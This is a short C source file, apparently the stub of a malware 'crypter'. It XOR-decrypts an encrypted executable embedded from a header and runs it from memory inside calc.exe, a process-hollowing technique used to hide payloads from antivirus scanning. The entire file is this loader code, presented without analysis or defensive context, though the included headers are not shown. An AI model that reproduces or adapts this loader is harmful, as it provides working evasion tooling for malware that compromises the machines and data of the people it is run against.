#include <windows.h>
#include <stdio.h>

#include "main.h"
#include "pe_image.h"

int main(){
    int i, x;
    char exec_file_path[1024];
    unsigned char decrypted_bytes[array_len+1] = {};

    for (i = 0; i < array_len; i++) {
      if (image_crypt[i] == null_key) {
        decrypted_bytes[i] = 0x00;
        image_crypt[i] = '\0';
      } else if (image_crypt[i] != null_key) {
        decrypted_bytes[i] = key ^ image_crypt[i];
        image_crypt[i] = '\0';
      }
    }

    //GetModuleFileNameA(0, exec_file_path, 1024); // Path to current executable.
    system("pause");
    RunFromMemory((char*)decrypted_bytes, (char*)"c:\\windows\\system32\\calc.exe");
    //RunFromMemory((char*)decrypted_bytes, exec_file_path;
    return 0;
}
